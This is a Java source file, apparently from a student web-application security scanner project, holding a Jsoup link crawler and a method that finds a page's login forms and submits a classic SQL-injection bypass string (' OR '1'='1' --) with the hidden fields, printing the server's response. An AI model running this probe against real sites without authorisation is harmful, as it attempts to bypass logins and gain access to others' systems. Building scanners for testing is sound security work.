/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.daiict.mscit.pl1.wasc.crawler;

import java.io.IOException;
import org.daiict.mscit.pl1.wasc.db.DAL;
import org.daiict.mscit.pl1.wasc.entities.Link;
import org.daiict.mscit.pl1.wasc.entities.LinkStore;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.helper.HttpConnection;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

/**
 *
 * @author VJ
 */
public class Crawler {

    private Link baseLink;
    private DAL dal;
    private LinkStore linkStore = null;

    public LinkStore getLinkStore() {
        return linkStore;
    }

    public void setLinkStore(LinkStore linkStore) {
        this.linkStore = linkStore;
    }

    public Crawler() {
        dal = new DAL();
    }

    public String getBaseURL() {
        return baseLink.getURL();
    }

    public void setBaseURL(String URL) {
        baseLink = new Link(dal.getNextURLID(), URL, "", 0);
        linkStore.getStore().put(baseLink.getID(), baseLink);
        boolean result = dal.persistLink(baseLink);
    }

    public void crawl() {
        crawl(baseLink);
    }

    public void crawl(Link URL) {
        crawl(URL, 2);
    }

    public void crawl(Link link, int depth) {
        boolean result;
        //List<Link> childNodes = new ArrayList<Link>();

        if (depth > 0) {
            try {
                /*
                 * if (link.getURL().contains((new
                 * String("orkut")).subSequence(0, 4))) { return; } if
                 * (link.getURL().contains((new
                 * String("facebook")).subSequence(0, 4))) { return; }
                 * if(link.getURL().contains((new
                 * String("twitter")).subSequence(0,4))) { return;}
                 */

                Document doc = Jsoup.connect(link.getURL()).get();
                Elements links = doc.select("a[href]");
                Link l;

                System.out.println(link.getID() + " " + link.getURL());

                for (Element subLink : links) {
                    l = new Link(dal.getNextURLID(), subLink.attr("abs:href"), link.getURL(), 1);
                    result = dal.persistLink(l);
                    linkStore.getStore().put(l.getID(), l);
                    //childNodes.add(l);
                }

                Link temp = linkStore.getStore().get(link.getID());
                if (temp != null) {
                    temp.setDone(0);
                    dal.updateLink(temp);
                } else {
                    link.setDone(0);
                    dal.updateLink(link);
                }

                depth--;
                //for (Link ll : childNodes) {
                for (Link ll : linkStore.getStore().values()) {
                    if(ll.getDone()!=0)
                        crawl(ll, depth);
                }

            } catch (Exception e) {
            }
        } else {
            return;
        }
    }

    public static void displayForm(String url) {
        try {

            Document doc = Jsoup.connect(url).get();
            String submitURL = "";

            Elements hidden = doc.select("input[type=hidden]");

            Elements forms = doc.select("form[action]");
            Elements textboxes = null;
            for (Element e : forms) {
                System.out.println(e.attr("abs:action"));
                submitURL = e.attr("abs:action");
                textboxes = e.getElementsByAttributeValue("type", "text");
                textboxes.addAll(e.getElementsByAttributeValue("type", "password"));
                for (Element child : textboxes) {
                    System.out.println(child.toString());
                }
            }

            //Document responseDoc = Jsoup.connect(url).ignoreHttpErrors(true).ignoreContentType(true).data("", "").post();
            //responseDoc.toString();

            Connection con = Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);
            con = con.data("uname", "' OR '1'='1'  -- '", "pass", "bomb");

            for (Element e1 : hidden) {
                System.out.println(e1.toString());
                con = con.data(e1.attr("name"), e1.attr("value"));
            }
            HttpConnection.Response res = (HttpConnection.Response) con.execute();

            int statusCode = res.statusCode();
            Document responseDoc = res.parse();
            System.out.println("Status Code : " + statusCode);
            System.out.println(responseDoc.toString());

        } catch (IOException ex) {
        }
    }
}
